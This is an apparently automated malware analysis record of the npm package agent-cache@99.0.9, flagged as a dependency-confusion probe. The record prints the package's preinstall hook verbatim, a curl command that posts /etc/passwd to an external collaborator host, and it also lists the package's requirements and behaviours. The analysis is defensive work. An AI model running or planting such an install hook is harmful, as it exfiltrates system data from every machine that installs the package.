# npm agent-cache@99.0.9

**Source:** datadog · **Source label:** malicious · **Released:** 2025-08-23 (registry) · **Assessment:** malicious (high) · **Analysis:** ai (claude-opus-5-5)

## Summary

The package is only a `package.json` with a `preinstall` hook that runs `sh -c` with one curl command. That command POSTs the path and contents of `/etc/passwd` to an oastify collaborator host (hxxps://aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com). There are no gates: it runs on every install where `sh`, `curl`, `/etc/passwd` and outbound HTTPS are available, which in practice means Linux or macOS.

## Execution

- **preinstall** `sh -c 'curl -sS -X POST --data-urlencode file=/etc/passwd --data-urlencode content@/etc/passwd hxxps://aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com'`: no package files; inline_shell.

## Gates

None.

## Requirements

- installed_tool: sh (the hook runs through sh -c)
- installed_tool: curl (the hook uses curl to send the file)
- file_present: /etc/passwd (curl reads it via content@/etc/passwd and fails if it is missing)
- network: aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com:443 (HTTPS POST target for the file contents)

## Behaviour

- Ungated: recon, exfil
- Gated: none

## Notes

- Version 99.0.9 and a generic internal-sounding name point to dependency confusion. The description calls it a security research PoC and gives a contact address (redacted here). That is package text and changes no label.
- The tool's `download_then_exec` launch style was removed because nothing is fetched and executed; curl only uploads.

## Record

```json
{
  "schema_version": "3.2",
  "record_type": "analysed",
  "package": {
    "ecosystem": "npm",
    "name": "agent-cache",
    "version": "99.0.9",
    "archive_sha256": "c7d8f2d0eb41f24ea86ebfe424f6214c1e9016b2ac03fa88500d96611bd10a70",
    "source_dataset": "datadog",
    "source_label": "malicious",
    "released_at": "2025-08-23",
    "released_at_source": "registry",
    "sample_path": "datadog/npm/malicious_intent/2025-08-23-agent-cache-v99.0.9.zip",
    "package_root": "layer0/tmp/tmpjcrr1bs4/agent-cache/package",
    "cluster_key": "7621f7df3ebb1691a1969dfab2d7aeb629fe2d0bfa893543fb45b57324f25a00",
    "analysis_type": "ai",
    "model_name": "claude-opus-5-5"
  },
  "execution": {
    "entry_points": [
      {
        "hook": "preinstall",
        "command": "sh -c 'curl -sS -X POST --data-urlencode file=/etc/passwd --data-urlencode content@/etc/passwd hxxps://aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com'",
        "runs_on": "always",
        "file_chain": [],
        "interpreter": "sh",
        "launch_style": [
          "inline_shell"
        ],
        "silent_failure": false
      }
    ],
    "delays": [],
    "notes": [
      "package.json is the only file and was read in full. The preinstall hook is one sh -c curl POST of /etc/passwd (path and contents) to an OAST host. Nothing is downloaded or run, so download_then_exec was removed.",
      "The hook command has no conditionals and reaches no package files, so there are no gates.",
      "silent_failure is false: curl -sS still prints errors, and a non-zero exit fails the preinstall."
    ]
  },
  "requirements": [
    {
      "axis": "installed_tool",
      "value": "sh",
      "reason": "the hook runs through sh -c"
    },
    {
      "axis": "installed_tool",
      "value": "curl",
      "reason": "the hook uses curl to send the file"
    },
    {
      "axis": "file_present",
      "value": "/etc/passwd",
      "reason": "curl reads it via content@/etc/passwd and fails if it is missing"
    },
    {
      "axis": "network",
      "value": "aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com:443",
      "reason": "HTTPS POST target for the file contents"
    }
  ],
  "conditions": [],
  "gates": [],
  "behaviours": {
    "ungated": [
      "recon",
      "exfil"
    ],
    "gated": []
  },
  "obfuscation": {
    "level": "none",
    "techniques": [],
    "decoded": null,
    "unrecovered": []
  },
  "reachability": {
    "needs_remote": true,
    "endpoints": [
      {
        "indicator": "hxxps://aaoozah838onyjtjfsehddop6gc70yon[.]oastify[.]com",
        "role": "exfil_sink"
      }
    ]
  },
  "attack_type": "dependency_confusion",
  "family_hint": "oastify dependency-confusion probe",
  "claude_assessment": "malicious",
  "assessment_reason": "The preinstall hook POSTs the contents of /etc/passwd to an external OAST collaborator host on every install, with no conditions. Whatever the stated research intent, it sends host data off every machine that installs it.",
  "label_disagreement": false,
  "confidence": "high",
  "needs_manual_review": false,
  "review_reasons": [],
  "normalisation": {
    "derivations": [],
    "candidate_set": {
      "generator": "gate_extract@88c7907d65",
      "sha256": "428960f5b8cf6c20"
    },
    "units_summary": [],
    "truncation": {
      "walk_limit": false,
      "context_limited_files": 0
    }
  },
  "candidate_review": {
    "dropped": []
  },
  "candidate_check": {
    "condition_candidates": 0,
    "condition_sites_cited": 0,
    "guards_cited": 0,
    "candidates_dropped": 0,
    "conditions_in_set": 0,
    "conditions_out_of_set": 0,
    "guard_candidates": 0,
    "gates_in_set": 0,
    "gates_out_of_set": 0,
    "out_of_set_ids": [],
    "anchor_refusals": 0
  }
}
```
